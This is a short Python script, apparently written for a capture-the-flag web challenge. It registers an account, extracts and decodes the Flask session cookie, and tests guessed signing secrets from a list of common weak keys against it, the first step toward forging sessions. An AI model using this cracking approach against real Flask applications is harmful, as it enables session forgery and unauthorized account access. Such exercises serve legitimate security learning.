import requests, base64, zlib, json, hashlib, hmac, struct, time

base = 'https://web-random-cheese.tracebash.xyz'

s = requests.Session()
s.post(f'{base}/register', data={'username': 'testforcrack', 'password': 'testforcrack'}, allow_redirects=False)
s.post(f'{base}/login', data={'username': 'testforcrack', 'password': 'testforcrack'}, allow_redirects=False)
cookie = s.cookies.get('session')
print('Cookie:', repr(cookie))

# Parse payload
parts = cookie.split('.')
# Flask format: .{payload}.{timestamp}.{signature} or {payload}.{timestamp}.{signature}
# Our cookie starts with '.' so it's: empty.payload.timestamp.signature
payload_b64 = parts[1]
timestamp_part = parts[2]
signature = parts[3]

# Add padding
padded = payload_b64 + '=' * (4 - len(payload_b64) % 4) if len(payload_b64) % 4 else payload_b64
try:
    decoded_raw = base64.urlsafe_b64decode(padded)
    print('Decoded raw:', decoded_raw)
    session_data = json.loads(decoded_raw)
    print('Session data:', session_data)
except:
    print('Failed to decode payload')

# Try a time-based prediction: the session timestamp might be the server time
# Let me get server time from Date header
print('\nTrying common flask secrets...')

# Common secrets list
common_secrets = [
    'secret', 'password', 'admin', 'flask', 'cheese', 'jerry', 'tom', 'changeme', 
    'key', 'debug', 'dev', 'development', 'production', 'session', 'super',
    'qwerty', '12345', '123456', '1234567', '12345678', '123456789',
    'password123', 'cheese', 'tomandjerry', 'lucky', 'draw', 'spin',
    'flag', 'ctf', 'secretkey', 'secret_key', 'flask-secret', 'itsdangerous'
]

# Try to use known flask-unsign approach
from itsdangerous import URLSafeTimedSerializer, Signer
from flask.sessions import TaggedJSONSerializer

secret = 'cheese'  # guess
print('Secret guess:', secret)

# Get the signer mechanism used by Flask
from itsdangerous.signer import HMACAlgorithm
salt = 'cookie-session'
signer_kwargs = dict(key_derivation='hmac', digest_method=hashlib.sha1)
s = URLSafeTimedSerializer(secret, salt=salt, signer_kwargs=signer_kwargs, serializer=TaggedJSONSerializer())

# Try to verify the cookie we have
try:
    data = s.loads(cookie)
    print('SUCCESS! Decoded:', data)
except:
    print('Failed with secret:', secret)